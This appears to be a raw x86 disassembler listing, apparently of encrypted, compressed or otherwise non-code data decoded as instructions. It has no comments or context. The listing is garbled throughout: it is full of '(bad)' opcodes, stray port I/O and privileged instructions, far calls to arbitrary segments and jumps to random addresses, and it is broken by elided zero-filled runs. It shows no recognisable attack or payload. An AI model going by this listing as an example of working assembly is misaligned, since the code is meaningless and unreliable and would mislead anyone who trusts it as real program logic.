  418edb:	icebp  
  418edc:	fistp  QWORD PTR [edi]
  418ede:	or     BYTE PTR [ebp-0x64],0xe
  418ee2:	push   ds
  418ee3:	outs   dx,BYTE PTR ds:[esi]
  418ee4:	into   
  418ee5:	fisttp WORD PTR [ecx]
  418ee7:	adc    DWORD PTR [edi-0x8],esp
  418eea:	jecxz  0x418f15
  418eec:	adc    eax,0x4b8d87fe
  418ef1:	out    dx,eax
  418ef2:	retf   0x91b8
  418ef5:	mov    esi,0x82f360be
  418efa:	pushf  
  418efb:	loope  0x418e7f
  418efd:	push   ds
  418efe:	sar    DWORD PTR [eax+0x7a],cl
  418f01:	(bad)  
  418f02:	(bad)  
  418f04:	mov    ?,WORD PTR [ebx-0x65]
  418f07:	cwde   
  418f08:	sub    al,0xd9
  418f0a:	outs   dx,BYTE PTR ds:[esi]
  418f0b:	jl     0x418f8c
  418f0d:	aaa    
  418f0e:	and    ah,bh
  418f10:	cmp    DWORD PTR [ecx+0x68635a9],0x9ceaf0b
  418f1a:	mov    ah,0x9f
  418f1c:	mov    eax,ds:0x6b939d70
  418f21:	pop    ebx
  418f22:	xchg   DWORD PTR [ecx+0x38fde8bf],esi
  418f28:	jmp    0x418f65
  418f2a:	jp     0x418f55
  418f2c:	xor    BYTE PTR [edx],al
  418f2e:	dec    eax
  418f2f:	mov    bl,0x89
  418f31:	lea    ecx,[edi-0x7]
  418f34:	loope  0x418f7b
  418f36:	test   eax,0x24ca0667
  418f3b:	pop    edi
  418f3c:	adc    BYTE PTR ds:0x8d48cf38,ch
  418f42:	adc    cl,bh
  418f44:	(bad)  
  418f45:	push   ecx
  418f46:	add    DWORD PTR [ebx+0x1b],edx
  418f49:	inc    esi
  418f4a:	cmovl  eax,DWORD PTR [edx]
  418f4d:	mov    al,0x13
  418f4f:	pop    eax
  418f50:	lahf   
  418f51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f52:	enter  0x59b7,0xbe
  418f56:	repz cwde 
  418f58:	ror    DWORD PTR ds:0x4dd30428,0x61
  418f5f:	pop    ss
  418f60:	fwait
  418f61:	dec    esp
  418f62:	or     al,0x41
  418f64:	pop    ecx
  418f65:	mov    BYTE PTR [eax-0x4b33538b],bh
  418f6b:	xchg   ecx,eax
  418f6c:	mov    ds:0xdf019420,eax
  418f71:	inc    edx
  418f72:	std    
  418f73:	mov    edx,0xc6fc3ca1
  418f78:	xor    ebp,0x71
  418f7b:	sub    DWORD PTR [eax+0x332a6fb6],edi
  418f81:	(bad)  
  418f82:	xchg   edx,eax
  418f83:	pop    ss
  418f84:	add    eax,0xba60515b
  418f89:	repz pop esp
  418f8b:	jnp    0x418f46
  418f8d:	test   DWORD PTR [ebp+0x4c87],ebp
	...
  418ff3:	add    BYTE PTR [edi+edx*4],bl
  418ff6:	in     al,0x47
  418ff8:	out    dx,eax
  418ff9:	ja     0x418fba
  418ffb:	fild   WORD PTR [ecx+0x2deaf1a7]
  419001:	and    edx,DWORD PTR [ebp+eiz*1-0x16]
  419005:	or     BYTE PTR [ecx],al
  419007:	add    BYTE PTR ds:0xab000001,al
  41900d:	mov    edx,0x80373e47
  419012:	sti    
  419013:	pop    ecx
  419014:	ins    BYTE PTR es:[edi],dx
  419015:	jbe    0x419095
  419017:	(bad)  
  419018:	fs dec eax
  41901a:	cmp    DWORD PTR [edi],0xc4ab6559
  419020:	mov    edx,0xe2d4485e
  419025:	cmc    
  419026:	push   cs
  419027:	cli    
  419028:	sub    bh,BYTE PTR [ebx-0xa]
  41902b:	jae    0x41907e
  41902d:	mov    edi,0x9e2b38cc
  419032:	and    DWORD PTR [eax],edx
  419034:	mov    dh,BYTE PTR [ebx]
  419036:	jmp    0xa2576e2a
  41903b:	jp     0x41901f
  41903d:	mov    al,ds:0x8416a38e
  419042:	icebp  
  419043:	sbb    BYTE PTR [ecx],0x8
  419046:	je     0x419083
  419048:	lods   eax,DWORD PTR ds:[esi]
  419049:	dec    eax
  41904a:	push   esi
  41904b:	xchg   ebp,eax
  41904c:	cmp    ch,0xa3
  41904f:	cmp    eax,0x145d85c9
  419054:	mov    ds:0x7f7a2119,al
  419059:	xlat   BYTE PTR ds:[ebx]
  41905a:	add    dh,BYTE PTR [eax]
  41905c:	mov    es,WORD PTR [edx-0x3f4a44a1]
  419062:	ins    DWORD PTR es:[edi],dx
  419063:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419064:	push   cs
  419065:	mov    dl,0x21
  419067:	add    bh,al
  419069:	jg     0x41904b
  41906b:	addr16 dec edi
  41906d:	adc    eax,0x65a299c9
  419072:	xchg   esi,eax
  419073:	add    al,0x46
  419075:	push   ebp
  419076:	dec    eax
  419077:	pushf  
  419078:	mov    ebx,0x7be2959a
  41907d:	rcl    BYTE PTR [esi+eax*2+0x425a59f9],1
  419084:	and    eax,0x74f60d44
  419089:	ins    BYTE PTR es:[edi],dx
  41908a:	and    esp,esp
  41908c:	retf   0x1768
  41908f:	div    ch
  419091:	and    al,BYTE PTR [ebp+0x7b]
  419094:	stos   BYTE PTR es:[edi],al
  419095:	dec    edx
  419096:	not    DWORD PTR fs:[edx]
  419099:	cdq    
  41909a:	mov    ecx,0xb3c7c509
  41909f:	mov    cl,0x2c
  4190a1:	push   ss
  4190a2:	stos   DWORD PTR es:[edi],eax
  4190a3:	dec    DWORD PTR [edi+0x5a]
  4190a6:	adc    eax,0x4cb5712e
  4190ab:	push   ebp
  4190ac:	push   eax
  4190ad:	mov    ebp,0xd4b4a90
  4190b2:	jl     0x4190c1
  4190b4:	push   ebx
  4190b5:	aad    0xc1
  4190b7:	xlat   BYTE PTR ds:[ebx]
  4190b8:	imul   eax,eax,0xc6808a22
  4190be:	ficomp WORD PTR [ebx+ecx*2+0x0]
  4190c2:	push   ebx
  4190c3:	mov    ecx,DWORD PTR [ecx-0x72]
  4190c6:	xor    eax,0xaa500c3
  4190cb:	mov    ds:0x8d06e5cd,al
  4190d0:	in     al,dx
  4190d1:	sbb    DWORD PTR [esi+edx*8],esp
  4190d4:	jge    0x419144
  4190d6:	mov    esp,0xbaec156b
  4190db:	add    bl,ch
  4190dd:	test   BYTE PTR [ebp+0x2b],cl
  4190e0:	repnz push es
  4190e2:	ja     0x41909c
  4190e4:	push   edi
  4190e5:	and    eax,0xec21792d
  4190ea:	rol    BYTE PTR [edi+0x6a5bf31a],0x7d
  4190f1:	fs sub eax,0x4d0a1837
  4190f7:	jp     0x4190bb
  4190f9:	push   edx
  4190fa:	imul   eax,DWORD PTR [ebx],0xffffffcb
  4190fd:	inc    ebp
  4190fe:	mov    BYTE PTR [edx],cl
  419100:	add    ecx,edi
  419102:	hlt    
  419103:	mov    cl,0x8
  419105:	xchg   edi,eax
  419106:	mov    ds:0x32dccd13,al
  41910b:	sub    eax,esp
  41910d:	repnz xor bl,BYTE PTR [eax]
  419110:	xor    BYTE PTR [eax],al
	...
  419172:	add    BYTE PTR [eax],al
  419174:	scas   eax,DWORD PTR es:[edi]
  419175:	test   DWORD PTR [esi-0xa441be],ebx
  41917b:	in     eax,dx
  41917c:	inc    esi
  41917d:	push   0x4d
  41917f:	or     ch,BYTE PTR [eax+ebx*2+0x9ef5de6]
  419186:	add    DWORD PTR [eax],eax
  419188:	add    eax,0xbe000001
  41918d:	jo     0x4191cf
  41918f:	imul   eax,DWORD PTR [ebp-0x5b7f11d5],0x71
  419196:	fwait
  419197:	sbb    BYTE PTR [esi],cl
  419199:	or     esp,esp
  41919b:	nop
  41919c:	jecxz  0x4191a6
  41919e:	mov    esp,0xebd99888
  4191a3:	adc    dh,al
  4191a5:	mov    al,ds:0x8255a762
  4191aa:	jp     0x419141
  4191ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191ad:	xchg   esp,eax
  4191ae:	test   eax,0x6abc029a
  4191b3:	(bad)  
  4191b4:	cld    
  4191b5:	ret    0xa59f
  4191b8:	jmp    0x87098885
  4191bd:	jge    0x466bdd07
  4191c3:	xor    DWORD PTR [ebx+0x28f0f5ed],ebx
  4191c9:	fmul   DWORD PTR [bp+si-0x63]
  4191cd:	dec    esp
  4191ce:	mov    edx,0xc894d957
  4191d3:	je     0x4191d3
  4191d5:	adc    al,0x4c
  4191d7:	mov    esi,0xa094519
  4191dc:	aaa    
  4191dd:	sbb    ch,cl
  4191df:	clc    
  4191e0:	iret   
  4191e1:	aad    0x82
  4191e3:	cli    
  4191e4:	(bad)  
  4191e5:	dec    edx
  4191e6:	sbb    BYTE PTR [ebx+0x2c418007],0x6
  4191ed:	call   0x2b3d:0xe309138e
  4191f4:	mov    cl,0x94
  4191f6:	aad    0xb4
  4191f8:	sub    al,0xd8
  4191fa:	cwde   
  4191fb:	mov    eax,ds:0x9c09d3e
  419200:	cld    
  419201:	mov    edx,DWORD PTR [eax]
  419203:	adc    esi,DWORD PTR [esi-0x16]
  419206:	and    ebx,ebp
  419208:	loop   0x4191b3
  41920a:	dec    eax
  41920b:	pop    edi
  41920c:	fnsave [eax]
  41920e:	sahf   
  41920f:	and    al,0x8d
  419211:	or     eax,0x99b53c6c
  419216:	jle    0x419295
  419218:	(bad)  
  419219:	cmp    bh,BYTE PTR [ebp+edx*2-0x8]
  41921d:	jl     0x419288
  41921f:	ins    DWORD PTR es:[edi],dx
  419220:	repnz arpl WORD PTR [edx+edx*8+0x71],sp
  419225:	pop    eax
  419226:	out    dx,eax
  419227:	push   edi
  419228:	xor    eax,0x9aeb9eec
  41922d:	inc    al
  41922f:	fwait
  419230:	imul   eax,DWORD PTR [esi+edx*1],0xe9461d1e
  419237:	push   cs
  419238:	dec    ecx
  419239:	ret    
  41923a:	call   0x8cb5:0xd8b705a1
  419241:	or     al,0xdb
  419243:	sbb    BYTE PTR [ecx-0x6e70b377],dl
  419249:	sar    BYTE PTR [eax],cl
  41924b:	dec    esi
  41924c:	inc    eax
  41924d:	sub    ax,0x1bae
  419251:	cwde   
  419252:	stos   BYTE PTR es:[edi],al
  419253:	fist   WORD PTR [edi-0x78ad726]
  419259:	je     0x4192a2
  41925b:	xor    ah,dh
  41925d:	cli    
  41925e:	mov    edi,0xe0171a3a
  419263:	xchg   edi,eax
  419264:	cwde   
  419265:	xlat   BYTE PTR ds:[ebx]
  419266:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419268:	imul   ebp,DWORD PTR ds:0x85e9266d,0xffffff92
  41926f:	pop    esp
  419270:	jge    0x41924a
  419272:	push   esp
  419273:	add    bl,dh
  419275:	lea    edx,[eax]
  419277:	sub    ebx,DWORD PTR [ecx]
  419279:	dec    edx
  41927a:	std    
  41927b:	int    0x95
  41927d:	lea    ecx,[edx-0x18]
  419280:	mov    esp,DWORD PTR [ecx]
  419282:	push   esp
  419283:	aad    0x70
  419285:	and    al,0x45
  419287:	dec    edi
  419288:	add    esi,ecx
  41928a:	lahf   
  41928b:	mov    ds:0xb37b3012,eax
  419290:	lea    eax,[eax]
	...
  4192f2:	add    BYTE PTR [eax],al
  4192f4:	mov    al,ds:0xff33bae7
  4192f9:	jg     0x4192a4
  4192fb:	neg    eax
  4192fd:	pop    ss
  4192fe:	daa    
  4192ff:	inc    edi
  419300:	(bad)  
  419301:	sub    eax,0xaf4904c
  419306:	add    DWORD PTR [eax],eax
  419308:	add    eax,0x81000001
  41930d:	inc    ebp
  41930e:	pop    esp
  41930f:	add    edx,DWORD PTR [ebx-0x77]
  419312:	ins    DWORD PTR es:[edi],dx
  419313:	div    DWORD PTR [ecx]
  419315:	inc    ebx
  419316:	arpl   WORD PTR fs:[eax+ebp*1],si
  41931a:	data16 (bad) 
  41931c:	repnz pop ds
  41931e:	pop    esp
  41931f:	cdq    
  419320:	mov    ds:0x7dcc9abc,al
  419325:	scas   al,BYTE PTR es:[edi]
  419326:	or     DWORD PTR [edi+ecx*2],edi
  419329:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41932a:	cmp    esi,DWORD PTR [ecx]
  41932c:	mov    cl,0x38
  41932e:	ins    DWORD PTR es:[edi],dx
  41932f:	sub    DWORD PTR [edi-0x7c],ebx
  419332:	pop    ebp
  419333:	ret    0xf42f
  419336:	popa   
  419337:	not    dh
  419339:	sub    al,0x8
  41933b:	mov    WORD PTR [edx+0x1d6a2d47],es
  419341:	iret   
  419342:	js     0x419359
  419344:	in     al,0x6c
  419346:	lods   eax,DWORD PTR ds:[esi]
  419347:	cmp    al,BYTE PTR [edi-0x1b]
  41934a:	cwde   
  41934b:	loop   0x4192e6
  41934d:	mov    al,ds:0x2280f053
  419352:	xor    DWORD PTR [edx-0x5ed4e122],ecx
  419358:	fs aam 0x2
  41935b:	dec    edi
  41935c:	push   ds
  41935d:	or     al,0x10
  41935f:	adc    DWORD PTR es:[eax],esp
  419362:	mov    ds:0xe76e830e,eax
  419367:	test   eax,0x60d7e61b
  41936c:	xchg   ebx,eax
  41936d:	(bad)  
  41936e:	shr    DWORD PTR [edi+0x43039694],0x83
  419375:	cwde   
  419376:	add    DWORD PTR [ebx+0x11],ebx
  419379:	xor    bl,BYTE PTR [eax]
  41937b:	add    BYTE PTR [esi+edi*8-0x2aed1faa],cl
  419382:	(bad)  
  419384:	and    al,0x0
  419386:	(bad)  
  419387:	push   edi
  419388:	xchg   esi,eax
  419389:	mov    ds:0x8874bef2,al
  41938e:	xor    BYTE PTR [eax-0x195ac70d],cl
  419394:	xor    DWORD PTR [ecx+edi*8-0x8],edi
  419398:	loope  0x419349
  41939a:	nop
  41939b:	mov    ds:0xfca4302c,eax
  4193a0:	sbb    eax,0x83793bf5
  4193a5:	mov    bh,BYTE PTR [eax+0x24]
  4193a8:	push   ebx
  4193a9:	push   cs
  4193aa:	xchg   edi,eax
  4193ab:	sti    
  4193ac:	inc    ebx
  4193ad:	mov    BYTE PTR [ebp+esi*2+0x403e80c8],al
  4193b4:	fwait
  4193b5:	add    dl,BYTE PTR [edx-0x4814d177]
  4193bb:	(bad)  
  4193bc:	jg     0x4193c1
  4193be:	push   0x32
  4193c0:	(bad)  
  4193c1:	mov    esp,DWORD PTR [esp+ebx*1-0x10877daa]
  4193c8:	xor    eax,0xbbdd0db7
  4193cd:	inc    esp
  4193ce:	jmp    0x419367
  4193d0:	xchg   ebx,eax
  4193d1:	shl    BYTE PTR [edi],1
  4193d3:	ror    bl,0xe0
  4193d6:	jbe    0x4193d2
  4193d8:	dec    eax
  4193d9:	pop    ebx
  4193da:	push   ds
  4193db:	mov    bh,0xf7
  4193dd:	adc    DWORD PTR [edi],edx
  4193df:	xchg   DWORD PTR [eax],ebp
  4193e1:	sub    bl,0x64
  4193e4:	pop    ecx
  4193e5:	in     eax,0xe7
  4193e7:	adc    eax,0x3a83bd86
  4193ec:	push   ebp
  4193ed:	sub    al,0x19
  4193ef:	push   0x31c2a7f
  4193f4:	clc    
  4193f5:	arpl   WORD PTR [esi+0x3f59a1a1],sp
  4193fb:	cmp    al,0x52
  4193fd:	xchg   ebp,eax
  4193fe:	add    BYTE PTR [edi],al
  419400:	or     DWORD PTR [edx],esp
  419402:	fwait
  419403:	ins    BYTE PTR es:[edi],dx
  419404:	fidivr WORD PTR [edi]
  419406:	sti    
  419407:	ret    0x6d5
  41940a:	jns    0x4193ef
  41940c:	je     0x41944b
  41940e:	xchg   DWORD PTR [ecx+0x6a],esp
	...
  419471:	add    BYTE PTR [eax],al
  419473:	add    BYTE PTR ds:0xed3a6998,bh
  419479:	sti    
  41947a:	jg     0x41941b
  41947c:	cmp    ebx,esi
  41947e:	je     0x419446
  419480:	rol    DWORD PTR [edx],cl
  419482:	clc    
  419483:	xchg   cl,bh
  419485:	or     eax,DWORD PTR [ecx]
  419487:	add    BYTE PTR ds:0xe9000001,al
  41948d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41948e:	jns    0x419445
  419490:	mov    ch,0x1a
  419492:	inc    ecx
  419493:	add    al,0x6e
  419495:	loope  0x419427
  419497:	int3   
  419498:	push   ebx
  419499:	xor    esi,ecx
  41949b:	sbb    al,0xb2
  41949d:	sti    
  41949e:	dec    ecx
  41949f:	and    eax,0x44ff5320
  4194a4:	(bad)  
  4194a5:	and    eax,0xb19748d0
  4194aa:	outs   dx,DWORD PTR ds:[esi]
  4194ab:	jbe    0x41947b
  4194ad:	imul   ebp,DWORD PTR [eax+0x5e],0x2a
  4194b1:	idiv   ebx
  4194b3:	and    bl,BYTE PTR [edx-0x2f]
  4194b6:	mov    cl,0xba
  4194b8:	lock ret 
  4194ba:	les    edx,FWORD PTR [ecx+ebx*8+0x58d51d91]
  4194c1:	or     al,0x16
  4194c3:	push   0x23fc1f98
  4194c8:	mov    ch,0x91
  4194ca:	adc    BYTE PTR [eax],dh
  4194cc:	xor    al,0x7e
  4194ce:	lods   eax,DWORD PTR ds:[esi]
  4194cf:	mov    al,0x1
  4194d1:	(bad)  
  4194d2:	sbb    DWORD PTR [edx+0x4aa10383],ecx
  4194d8:	push   esi
  4194d9:	cdq    
  4194da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194db:	sub    ebx,edi
  4194dd:	mov    ah,0x7a
  4194df:	ins    DWORD PTR es:[edi],dx
  4194e0:	sub    al,0xfa
  4194e2:	xor    ebx,DWORD PTR [edi+edi*1-0x7]
  4194e6:	cmp    al,0xa
  4194e8:	bound  edi,QWORD PTR [eax+0x2c8b8a80]
  4194ee:	imul   ecx,DWORD PTR [ebp-0x73],0xffffffe6
  4194f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194f3:	cdq    
  4194f4:	call   0x13bf:0xe79c1869
  4194fb:	fbld   TBYTE PTR [ebp+0x2e7a34e4]
  419501:	cmc    
  419502:	sbb    eax,0x1d176f73
  419507:	mov    eax,ds:0x310c00c6
  41950c:	iret   
  41950d:	pusha  
  41950e:	cdq    
  41950f:	scas   eax,DWORD PTR es:[edi]
  419510:	push   ecx
  419511:	and    dl,BYTE PTR [ecx]
  419513:	dec    ebp
  419514:	retf   
  419515:	js     0x41955c
  419517:	jg     0x41957f
  419519:	aas    
  41951a:	sub    DWORD PTR [ecx-0x24],edx
  41951d:	test   eax,0xbc2a1fa
  419522:	clc    
  419523:	imul   eax,DWORD PTR [esi+0x3dda7b87],0xdbc92005
  41952d:	imul   esi,DWORD PTR [edx+0x18],0xbd749cba
  419534:	xchg   edi,eax
  419535:	sub    al,bh
  419537:	lods   al,BYTE PTR ds:[esi]
  419538:	jns    0x419544
  41953a:	push   ebp
  41953b:	ins    BYTE PTR es:[edi],dx
  41953c:	inc    edx
  41953d:	sar    DWORD PTR [ecx],1
  41953f:	xor    al,0x38
  419541:	and    ecx,DWORD PTR [edi]
  419543:	cmc    
  419544:	fadd   QWORD PTR [edx]
  419546:	repz call 0xeb7a6732
  41954c:	pop    esi
  41954d:	xchg   esi,ecx
  41954f:	cmc    
  419550:	jnp    0x4195a1
  419552:	pusha  
  419553:	jbe    0x419561
  419555:	jno    0x419533
  419557:	ds dec ecx
  419559:	mov    eax,0x5b888790
  41955e:	mov    bl,0x16
  419560:	xor    al,BYTE PTR [ecx]
  419562:	jnp    0x4195dc
  419564:	push   0xec6d9bb9
  419569:	iret   
  41956a:	icebp  
  41956b:	cld    
  41956c:	loop   0x41956b
  41956e:	add    cl,BYTE PTR [edx-0x77973da6]
  419574:	xchg   DWORD PTR [ecx+0x6],eax
  419577:	out    0x34,al
  419579:	pop    ss
  41957a:	or     BYTE PTR ds:0x529a6eea,ah
  419580:	and    edx,DWORD PTR [edi+0x1c7c1574]
  419586:	inc    edx
  419587:	(bad)  
  419588:	jg     0x419572
  41958a:	std    
  41958b:	mov    BYTE PTR [ebp+0x1a],dl
  41958e:	call   0x0:0x3201
	...
  4195f1:	add    BYTE PTR [eax],al
  4195f3:	add    BYTE PTR [edi-0x9d722c],ch
  4195f9:	jnp    0x4195ea
  4195fb:	fstp   st(1)
  4195fd:	fcomp  QWORD PTR [ebx+0x2f]
  419600:	ret    0x8186
  419603:	cmp    dh,0xc
  419606:	add    DWORD PTR [eax],eax
  419608:	add    eax,0x7000001
  41960d:	repz inc edi
  41960f:	or     bl,dh
  419611:	shr    DWORD PTR [ebx],0xbc
  419614:	xchg   edi,eax
  419615:	std    
  419616:	add    eax,0xb9349cd4
  41961b:	cdq    
  41961c:	add    edi,DWORD PTR [ecx+0xaf62b8d]
  419622:	mov    DWORD PTR [esi+ebp*4+0x150c5f36],eax
  419629:	mov    ds:0x7c549073,al
  41962e:	push   ebp
  41962f:	ins    DWORD PTR es:[edi],dx
  419630:	push   ebp
  419631:	sbb    al,0x17
  419633:	loope  0x419602
  419635:	push   esp
  419636:	push   ebp
  419637:	fcom   DWORD PTR [edi]
  419639:	mov    bh,0xbf
  41963b:	idiv   bh
  41963d:	inc    ebp
  41963e:	cdq    
  41963f:	xchg   DWORD PTR [ecx],ebx
  419641:	cmc    
  419642:	mov    ah,BYTE PTR [ecx]
  419644:	add    esp,DWORD PTR [eax-0x6199b82f]
  41964a:	cwde   
  41964b:	sti    
  41964c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41964d:	or     eax,0x3d8c9cd4
  419652:	xchg   esi,eax
  419653:	jo     0x41969f
  419655:	dec    edx
  419656:	push   ds
  419657:	dec    esi
  419658:	int3   
  419659:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41965a:	jbe    0x419623
  41965c:	sub    ebp,DWORD PTR [ecx+0x7fdf5066]
  419662:	cmp    ecx,DWORD PTR [ecx+0x3ae67125]
  419668:	ret    
  419669:	lds    ecx,FWORD PTR [ebx]
  41966b:	aad    0xb0
  41966d:	lahf   
  41966e:	out    dx,al
  41966f:	lods   eax,DWORD PTR ds:[esi]
  419670:	mov    dl,BYTE PTR [ebx-0x408f9584]
  419676:	xchg   edi,eax
  419677:	sub    eax,0x2ae2e985
  41967c:	mov    bl,BYTE PTR [ebx]
  41967e:	fscale 
  419680:	dec    esp
  419681:	cdq    
  419682:	(bad)  [edx+0x7f553397]
  419688:	mov    ah,0x59
  41968a:	es in  al,0x83
  41968d:	(bad)  
  41968e:	sub    DWORD PTR [eax-0x2c],eax
  419691:	sub    DWORD PTR [edi],edx
  419693:	ffreep st(0)
  419695:	inc    edi
  419696:	or     BYTE PTR [edx+0x1],ah
  419699:	jb     0x4196dc
  41969b:	jne    0x419633
  41969d:	push   cs
  41969e:	xor    al,BYTE PTR [esi+0x1f936a4e]
  4196a4:	pop    ebp
  4196a5:	push   ds
  4196a6:	sbb    esp,DWORD PTR [esi]
  4196a8:	adc    ah,bh
  4196aa:	lods   al,BYTE PTR ds:[esi]
  4196ab:	mov    DWORD PTR [ebx],ebx
  4196ad:	sub    ebp,DWORD PTR [ebx-0x372b5d63]
  4196b3:	mov    edi,0x11cff209
  4196b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4196b9:	xor    eax,0x51e35b8
  4196be:	dec    edx
  4196bf:	pop    ebx
  4196c0:	test   ebx,0x7a76a819
  4196c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196c7:	sti    
  4196c8:	or     BYTE PTR [ecx+0x2d0c0f93],0x87
  4196cf:	dec    esi
  4196d0:	dec    ebx
  4196d1:	sbb    al,0x57
  4196d3:	or     al,0x8d
  4196d5:	(bad)  
  4196d6:	int    0x39
  4196d8:	mov    edi,0x6054fc3
  4196dd:	(bad)  
  4196de:	jbe    0x419704
  4196e0:	retf   
  4196e1:	stos   DWORD PTR es:[edi],eax
  4196e2:	out    0x6f,eax
  4196e4:	or     bl,BYTE PTR [esi+0x59198c0f]
  4196ea:	add    ecx,DWORD PTR [edi+ebx*2]
  4196ed:	or     dh,cl
  4196ef:	sar    BYTE PTR [edx-0x79],1
  4196f2:	mov    edi,0x20c378f9
  4196f7:	push   ds
  4196f8:	mov    dl,0x86
  4196fa:	popf   
  4196fb:	popa   
  4196fc:	(bad)  
  4196fd:	icebp  
  4196fe:	mov    ah,0x42
  419700:	or     al,0x1d
  419702:	in     al,0x98
  419704:	je     0x419705
  419706:	inc    edi
  419707:	dec    esp
  419708:	retf   
  419709:	mov    ch,0xbd
  41970b:	and    al,dl
  41970d:	sub    ebx,edi
  41970f:	retf   0xcf
	...
  419772:	add    BYTE PTR [eax],al
  419774:	mov    bl,0x3f
  419776:	jno    0x4197dd
  419778:	std    
  419779:	outs   dx,DWORD PTR ds:[esi]
  41977a:	mov    bh,0xff
  41977c:	add    eax,0x798dd0ae
  419781:	(bad)  
  419782:	xchg   edi,eax
  419783:	cdq    
  419784:	add    ecx,DWORD PTR [esi]
  419786:	add    DWORD PTR [eax],eax
  419788:	add    eax,0x8d000001
  41978d:	loope  0x4197dd
  41978f:	ins    BYTE PTR es:[edi],dx
  419790:	add    ch,BYTE PTR gs:[ecx-0x1]
  419794:	adc    al,0x50
  419796:	loope  0x4197ab
  419798:	ds in  eax,dx
  41979a:	in     al,0x53
  41979c:	adc    eax,0x419e3b26
  4197a1:	inc    edi
  4197a2:	mov    cl,0x7a
  4197a4:	or     DWORD PTR [edx],ecx
  4197a6:	out    dx,al
  4197a7:	push   cs
  4197a8:	popf   
  4197a9:	das    
  4197aa:	ins    DWORD PTR es:[edi],dx
  4197ab:	push   0xffffff92
  4197ad:	out    dx,eax
  4197ae:	scas   eax,DWORD PTR es:[edi]
  4197af:	in     eax,0x11
  4197b1:	test   al,0xad
  4197b3:	sub    eax,edx
  4197b5:	shl    DWORD PTR [ebx+0x510c0db3],cl
  4197bb:	sbb    BYTE PTR [esi+0x6633a0a3],al
  4197c1:	ds std 
  4197c3:	sub    DWORD PTR [ebx+0x6e],edx
  4197c6:	retf   0xec7c
  4197c9:	aaa    
  4197ca:	es pop ss
  4197cc:	sub    al,bl
  4197ce:	sbb    edi,ecx
  4197d0:	xor    bh,BYTE PTR [ecx+0x79]
  4197d3:	mov    al,ds:0xac3d0083
  4197d8:	mov    bh,0x88
  4197da:	loope  0x4197a5
  4197dc:	jmp    0x307bb2d9
  4197e1:	mov    BYTE PTR [ebx+0x700768a],bh
  4197e7:	pusha  
  4197e8:	sub    DWORD PTR [ebx],ebp
  4197ea:	xchg   esp,eax
  4197eb:	arpl   dx,si
  4197ed:	(bad)  
  4197ee:	xchg   ebx,eax
  4197ef:	add    al,0xa6
  4197f1:	inc    ebx
  4197f2:	mov    ebx,0x721bb115
  4197f7:	mov    edi,0xd9100998
  4197fc:	aas    
  4197fd:	loop   0x41980c
  4197ff:	or     ch,ah
  419801:	call   0xf1dffdbb
  419806:	stos   BYTE PTR es:[edi],al
  419807:	leave  
  419808:	and    BYTE PTR [edi],bl
  41980a:	cmp    ebx,DWORD PTR [eax-0x6454fe14]
  419810:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419811:	stc    
  419812:	in     eax,0x5e
  419814:	inc    eax
  419815:	(bad)  
  419816:	cdq    
  419817:	iret   
  419818:	(bad)  
  419819:	push   edi
  41981a:	shr    DWORD PTR [edi+0x7c],0x37
  41981e:	jmp    0x419849
  419820:	loop   0x41987b
  419822:	jg     0x419881
  419824:	imul   edx,DWORD PTR [ecx+edi*8],0x61
  419828:	and    edi,edi
  41982a:	and    al,0x8e
  41982c:	xor    eax,0xa3c69998
  419831:	inc    ecx
  419832:	in     al,0x46
  419834:	retf   
  419835:	ins    BYTE PTR es:[edi],dx
  419836:	scas   al,BYTE PTR es:[edi]
  419837:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419838:	fstp   QWORD PTR [ebp+0x55bca8a3]
  41983e:	clc    
  41983f:	nop
  419840:	cmp    al,0x1e
  419842:	and    esi,DWORD PTR [ebx+eax*2]
  419845:	das    
  419846:	(bad)  
  419847:	xor    BYTE PTR [edi-0x7b8a2e9e],dh
  41984d:	ins    DWORD PTR es:[edi],dx
  41984e:	add    BYTE PTR [edx+ecx*2-0x42],bh
  419852:	ret    
  419853:	jecxz  0x41980e
  419855:	sti    
  419856:	mov    esp,0x700760e1
  41985b:	xchg   ebx,eax
  41985c:	xor    edi,DWORD PTR [ebp-0x68]
  41985f:	adc    esi,eax
  419861:	and    eax,ebx
  419863:	in     al,0x93
  419865:	jle    0x41983a
  419867:	jns    0x4197fa
  419869:	push   edx
  41986a:	mov    fs,WORD PTR [edi+0x944606c]
  419870:	inc    ebp
  419871:	xor    al,0xfd
  419873:	mov    ds:0xaed83956,al
  419878:	xchg   BYTE PTR [ebx],al
  41987a:	(bad)  
  41987b:	shl    BYTE PTR [edi+0x12],cl
  41987e:	or     BYTE PTR [esi-0x3e788d68],al
  419884:	inc    esi
  419885:	mov    eax,0xb3b6764b
  41988a:	nop
  41988b:	fwait
  41988c:	dec    esp
  41988d:	xor    eax,0x807803
	...
  4198f2:	add    BYTE PTR [eax],al
  4198f4:	sbb    BYTE PTR [ecx],0x47
  4198f7:	loope  0x4198d8
  4198f9:	jmp    DWORD PTR [esi+0x45e3657b]
  4198ff:	fstp   st(1)
  419901:	(bad)  
  419902:	inc    eax
  419903:	mov    eax,ds:0x10f08
  419908:	add    eax,0xf2000001
  41990d:	mov    cl,0x80
  41990f:	iret   
  419910:	dec    edx
  419911:	push   ds
  419912:	repz push cs
  419914:	add    eax,0xee54cd45
  419919:	add    ebp,edx
  41991b:	or     dh,BYTE PTR [eax+esi*4-0x9241509]
  419922:	mov    al,0x51
  419924:	pop    edx
  419925:	adc    BYTE PTR [edx-0x3],ch
  419928:	mov    ebx,0x607f8107
  41992d:	mov    cl,BYTE PTR [esi]
  41992f:	xchg   ebx,eax
  419930:	rcr    BYTE PTR [ebp+0x634eb394],0xd
  419937:	imul   ecx,DWORD PTR [edx+0x998662a],0x94a18e51
  419941:	int3   
  419942:	adc    eax,ecx
  419944:	mov    DWORD PTR [esi],ebp
  419946:	ret    0xba51
